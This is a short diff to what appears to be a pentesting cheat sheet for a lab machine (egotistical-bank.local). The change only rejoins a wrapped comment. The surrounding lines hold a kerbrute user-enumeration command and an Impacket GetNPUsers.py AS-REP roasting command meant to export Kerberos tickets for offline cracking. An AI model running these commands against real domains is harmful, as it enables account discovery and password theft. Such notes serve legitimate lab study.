@@ -1569,8 +1569,7 @@ upx kerbrute
 
 kerbrute userenum --dc 10.10.10.175 -d egotistical-bank.local -t 50 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
 
-[*] Queries target domain for users with 'Do not require Kerberos
-preauthentication' set and export their TGTs for cracking
+[*] Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking
 
 GetNPUsers.py egotistical-bank.local/ -no-pass -usersfile users.txt
 """
